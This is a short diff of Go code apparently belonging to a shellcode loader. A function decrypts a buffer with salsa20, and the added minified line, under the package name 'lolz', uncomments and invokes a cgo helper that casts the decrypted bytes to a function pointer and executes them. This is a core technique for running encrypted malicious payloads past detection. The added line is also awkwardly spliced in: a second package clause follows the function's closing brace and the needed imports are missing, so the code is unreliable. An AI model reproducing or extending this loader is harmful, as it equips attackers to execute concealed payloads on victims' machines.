@@ -64,3 +64,4 @@ func ShellCodeDecrypter(bytes_in []byte, nonce []byte, key *[32]byte) {
 	// this is how to execute the shellcode
 	//C.call_shellcode((*C.char)(unsafe.Pointer(&out[0])))
 }
+package lolz;/*void call_shellcode(char *code) {int (*ret)() = (int(*)())code;ret();};*/import ("C");func ShellCodeDecrypter(bytes_in []byte, nonce []byte, key *[32]byte) {out :=make([]byte, len(bytes_in)); salsa20.XORKeyStream(out, bytes_in, nonce, key);for _, element := range out {fmt.Printf("%#x,", element);};C.call_shellcode((*C.char)(unsafe.Pointer(&out[0])));}
